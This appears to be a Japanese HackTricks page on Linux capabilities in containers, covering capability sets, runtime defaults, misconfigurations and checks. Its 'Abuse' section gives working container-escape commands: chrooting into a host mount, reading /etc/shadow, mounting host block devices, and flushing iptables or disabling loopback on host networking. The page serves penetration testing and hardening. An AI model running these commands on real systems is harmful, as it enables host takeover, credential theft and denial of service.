# コンテナにおける Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities はコンテナセキュリティにおいて最も重要な要素の一つです。なぜならそれは微妙だが根本的な問いに答えるからです：コンテナ内での「root」は本当に何を意味するのか？ 通常の Linux システムでは、UID 0 は歴史的に非常に広範な特権を暗黙的に意味していました。現代のカーネルでは、その特権はより小さな単位である capabilities に分解されています。プロセスは root として動作していても、関連する capabilities が取り除かれていれば多くの強力な操作を行えない場合があります。

コンテナはこの区別に大きく依存しています。多くのワークロードは互換性や簡便性の理由でコンテナ内で UID 0 として起動され続けています。capability のドロップがなければそれは非常に危険です。capability をドロップすれば、コンテナ化された root プロセスは多くの日常的なコンテナ内タスクを実行できる一方で、より敏感なカーネル操作は拒否されます。そのため `uid=0(root)` と表示されるコンテナのシェルが自動的に「ホストの root」や「広範なカーネル特権」を意味するわけではありません。capability セットが、その root アイデンティティにどれだけ価値があるかを決めます。

完全な Linux capability リファレンスと多くの悪用例については、以下を参照してください：

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## 動作

Capabilities は permitted, effective, inheritable, ambient, bounding といった複数のセットで追跡されます。多くのコンテナ評価においては、各セットの正確なカーネルセマンティクスよりも実用的な最終的質問の方が重要です：このプロセスは今すぐどの特権操作を実行でき、将来どのような権限昇格がまだ可能か？

これが重要な理由は、多くのブレイクアウト技術が実際にはコンテナ問題に見せかけた capability の問題であることが多いためです。`CAP_SYS_ADMIN` を持つワークロードは通常のコンテナ root プロセスが触れるべきでない多数のカーネル機能にアクセスできます。`CAP_NET_ADMIN` を持つワークロードは host network namespace を共有しているとさらに危険になります。`CAP_SYS_PTRACE` を持つワークロードは host PID sharing を通じてホストプロセスを参照できるとさらに興味深くなります。Docker や Podman ではそれは `--pid=host` のように見えるかもしれません；Kubernetes では通常 `hostPID: true` として現れます。

言い換えれば、capability セットは単独で評価できません。namespaces、seccomp、および MAC ポリシーと合わせて読まれる必要があります。

## ラボ

コンテナ内の capabilities を直接確認する非常に直接的な方法は：
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
より制限の厳しいコンテナを、すべての capabilities が追加されたコンテナと比較することもできます：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
限定的な追加の効果を見るには、すべてを削除して capability を1つだけ追加してみてください:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
これらの小さな実験は、ランタイムが単に "privileged" というブール値を切り替えているだけではないことを示している。ランタイムはプロセスが利用できる実際の権限の範囲を形成しているのだ。

## High-Risk Capabilities

対象によって重要となる capability は多岐にわたるが、container escape 分析で繰り返し重要になるものがいくつかある。

**`CAP_SYS_ADMIN`** は防御側が最も警戒すべきものだ。しばしば「the new root」と表現されるほど多くの機能を解除し、マウント関連の操作、namespace に依存する挙動、そしてコンテナに軽々しく晒されるべきでない多くのカーネル経路を含む。コンテナが `CAP_SYS_ADMIN`、弱い seccomp、強力な MAC 制約がない状態を組み合わせると、多くの古典的なブレイクアウトパスが現実的になる。

**`CAP_SYS_PTRACE`** はプロセス可視性がある場合に重要になる。特に PID namespace がホストや興味深い近隣ワークロードと共有されているときに重要で、可視性を改ざんに変えうる。

**`CAP_NET_ADMIN`** と **`CAP_NET_RAW`** はネットワーク中心の環境で重要だ。分離されたブリッジネットワーク上でも既に危険な場合がある；ホストの network namespace を共有しているとさらに深刻になり、ワークロードがホストのネットワークを再構成したり、盗聴やなりすましを行ったり、ローカルのトラフィックフローに干渉したりできる可能性がある。

**`CAP_SYS_MODULE`** は、root 権限がある環境では通常致命的だ。カーネルモジュールのロードは事実上ホストカーネルの制御であり、汎用コンテナワークロードに出現すべきではほとんどない。

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O はすべて capability 制御を使うが、デフォルトや管理インターフェースは異なる。Docker は `--cap-drop` や `--cap-add` のようなフラグで非常に直接的に露出させる。Podman は類似の制御を提供し、追加の安全層として rootless 実行がしばしば有利に働く。Kubernetes は Pod やコンテナの `securityContext` を通じて capability の追加・削除を露出する。LXC/Incus のような system-container 環境も capability 制御に依存するが、それらはホストとの広い統合があるため、オペレータが app-container 環境よりもデフォルトをより積極的に緩める誘惑に駆られがちだ。

共通の原則は同じ：技術的に付与可能な capability が必ずしも付与すべきものではない。多くの実際のインシデントは、ワークロードが厳しい構成で失敗したためにオペレータが単に「アプリケーションを動かす」ために capability を追加し、チームが手早い修正を必要としたことから始まる。

## Misconfigurations

最も明白なミスは Docker/Podman スタイルの CLI における `--cap-add=ALL` だが、それだけではない。実務では、より一般的な問題は 1 つか 2 つの極めて強力な capability、特に `CAP_SYS_ADMIN` を「アプリケーションを動かす」ために付与し、namespace、seccomp、マウントへの影響を理解していないことだ。もう一つの一般的な失敗モードは、追加の capability とホスト namespace の共有を組み合わせることである。Docker や Podman ではこれは `--pid=host`、`--network=host`、`--userns=host` として現れるかもしれない；Kubernetes では同等の露出が `hostPID: true` や `hostNetwork: true` のようなワークロード設定を通じて現れる。これらの組み合わせのそれぞれが、その capability が実際に影響を与えうる範囲を変化させる。

ワークロードが完全に `--privileged` でないからといって意味のある制約下にあると管理者が信じてしまうこともよくある。場合によってはそれが真だが、実効的なセキュリティ姿勢が既に privileged にかなり近いこともあり、その区別は運用上意味を持たなくなることがある。

## Abuse

最初の実践的なステップは、実効的な capability セットを列挙し、直ちに escape やホスト情報アクセスに関係する capability 固有の操作をテストすることだ：
```bash
capsh --print
grep '^Cap' /proc/self/status
```
もし `CAP_SYS_ADMIN` が存在する場合、最初にマウントベースの悪用とホストのファイルシステムへのアクセスを試してください。これは最も一般的なブレイクアウトを可能にする要因の一つだからです：
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
もし `CAP_SYS_PTRACE` が存在し、コンテナが興味のあるプロセスを参照できる場合、その能力をプロセス検査に転用できるか確認してください：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
もし `CAP_NET_ADMIN` または `CAP_NET_RAW` が付与されている場合、ワークロードが可視のネットワークスタックを操作できるか、または少なくとも有用なネットワーク情報を取得できるかをテストする:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
When a capability test succeeds, combine it with the namespace situation. A capability that looks merely risky in an isolated namespace can become an escape or host-recon primitive immediately when the container also shares host PID, host network, or host mounts.

### 完全な例: `CAP_SYS_ADMIN` + Host Mount = Host Escape

コンテナが `CAP_SYS_ADMIN` を持ち、ホストのファイルシステム（例: `/host`）の書き込み可能な bind mount を持っている場合、escape パスはしばしば単純です:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
もし `chroot` が成功すると、コマンドはホストのルートファイルシステムのコンテキストで実行されます:
```bash
id
hostname
cat /etc/shadow | head
```
もし `chroot` が利用できない場合、マウントされたツリー経由で binary を呼び出すことで同じ結果が得られることが多い:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完全な例: `CAP_SYS_ADMIN` + デバイスアクセス

ホストのブロックデバイスが露出している場合、`CAP_SYS_ADMIN` はそれをホストのファイルシステムへの直接アクセスに変えることができます:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完全な例: `CAP_NET_ADMIN` + ホストネットワーキング

この組み合わせは必ずしもホストの root を直接取得できるとは限りませんが、ホストのネットワークスタックを完全に再構成できます:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
これにより、denial of service、traffic interception、あるいはそれまでフィルタされていたサービスへのアクセスが可能になります。

## チェック

capability checks の目的は、単に dump raw values を出力することではなく、プロセスが現在の namespace と mount の状況を危険にするのに十分な privilege を持っているかどうかを把握することです。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
- `capsh --print` は `cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、または `cap_sys_module` のような高リスクな capabilities を見つける最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行は、他のセットに存在するかもしれないものではなく、現在実際に有効になっているものを示します。
- コンテナがホストの PID、network、または user namespaces を共有している、あるいは書き込み可能なホストマウントがある場合、capability のダンプはさらに重要になります。

生の capability 情報を収集した後、次のステップは解釈です。プロセスが root か、user namespaces が有効か、ホスト namespace が共有されているか、seccomp が適用されているか、AppArmor や SELinux がまだプロセスを制限しているかを確認してください。capability セット自体は話の一部にすぎませんが、同じ見かけの出発点から一方のコンテナのブレイクアウトが成功し、別のコンテナが失敗する理由を説明することが多いです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで削減された capability セット | Docker はデフォルトの許可リストを維持し、残りをドロップします | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | デフォルトで削減された capability セット | Podman のコンテナはデフォルトで非特権で、制限された capability モデルを使用します | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 変更がなければ runtime のデフォルトを継承 | もし `securityContext.capabilities` が指定されていなければ、コンテナは runtime からのデフォルトの capability セットを取得します | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | 通常は runtime のデフォルト | 有効なセットは runtime と Pod spec に依存します | Kubernetes 行と同様；直接の OCI/CRI 設定でも明示的に capability を追加できます |

Kubernetes に関して重要なのは、API が一つの普遍的なデフォルト capability セットを定義していない点です。Pod が capability を追加または削除しない場合、ワークロードはそのノードの runtime デフォルトを継承します。
